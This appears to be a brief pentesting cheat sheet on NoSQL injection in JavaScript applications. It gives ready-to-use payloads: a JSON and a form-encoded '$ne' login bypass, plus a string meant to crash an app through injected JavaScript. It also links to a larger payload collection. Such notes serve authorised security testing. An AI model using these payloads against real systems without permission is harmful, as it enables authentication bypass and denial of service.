# info

When there is a javascript application you should check for nosql injection. You maybe need to change the content type to json.

See https://book.hacktricks.xyz/pentesting-web/nosql-injection for more payloads.

# json

```json
{"user":"admin", "password": { "$ne": "asdf"}}
```

# txt

```txt
username[$ne]=asdf&password[$ne]=asdf
```

# nosql-injection crash app

```txt
`a'; return this.a != 'BadData’'; var dummy='!`
```
